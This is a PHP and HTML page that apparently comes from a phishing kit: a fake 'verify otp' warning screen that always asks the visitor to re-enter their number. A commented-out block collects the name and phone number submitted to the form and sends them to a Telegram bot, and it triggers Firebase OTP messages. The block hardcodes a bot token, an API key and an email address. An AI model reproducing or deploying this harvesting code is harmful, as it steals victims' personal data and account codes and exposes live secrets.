
<?php /*
$botToken = "7720546289:AAGdqF1CC8TGvRilFa7-bhXmanmwFoiefRo";
$chatID = "6389977474"; 


$name = $_POST['name'];
$num = $_POST['num'];


$message = "name: " . $name . "\n";
$message .= "Number: " . $num . "\n";


$telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);

$response = file_get_contents($telegramAPI);






session_start();

function sendOtp($phoneNumber) {
    $apiKey = 'AIzaSyCoZysZKI0E_-9-KGV1uux774lZYc4W-zc'; // Apni Firebase API Key yahan daalein.
    
    // Firebase authentication endpoint
    $url = 'https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=' . $apiKey;

    // Prepare the data for sending OTP
    $data = [
        'requestType' => 'PASSWORD_RESET', // Using this request type to send OTP
        'email' => 'alitosif158@gmail.com', // Leave it empty
        'phoneNumber' => $phoneNumber,
    ];

    // Initialize cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
    ]);

    // Execute the request
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response, true);
}

// Use this function to send OTP
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phoneNumber = $_POST['num'];
    $response = sendOtp($phoneNumber);

    if (isset($response['error'])) {
        echo 'Error: ' . $response['error']['message'];
    } else {
        // OTP sent successfully
        $_SESSION['verificationId'] = $response['verificationId']; // Store verification ID for later
$_SESSION['num'] = $phoneNumber;
        header('Location: go.php');
    }
}

*/


?>
<html>
  <head>
    <title> verify otp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>
      body{
        display: grid;
        place-items: center;
        
      }
      .box{
        width:90%;
        height: 250px;
        background:url('about-img.jpg') ;
        background-size: cover;
        background-position: center;
        color: white;
        border-radius: 20px;
        border: 2px solid black;
        box-shadow: 0px 0px 10px 6px #d53939;
        display: grid;
        place-items: center;
        
      }
      a{
        background: black;
        width: 150px;
      height: 35px;
      border:2px solid white;
      border-radius:5px;
      text-decoration: none;
      justify-content: center;
    color:white;
    align-items: center;
    display: flex;
      }
    </style>
  </head>
  <body>
    <div class='box'>
      <h1 >warning ?</h1>
      <?php 
      if(isset($_GET)){
  echo '<p style="color:red;"> !please enter correct Number</p>';
} ?>
<a href='login-form.php'> Please try again</a>
    </div>
  </body>
</html>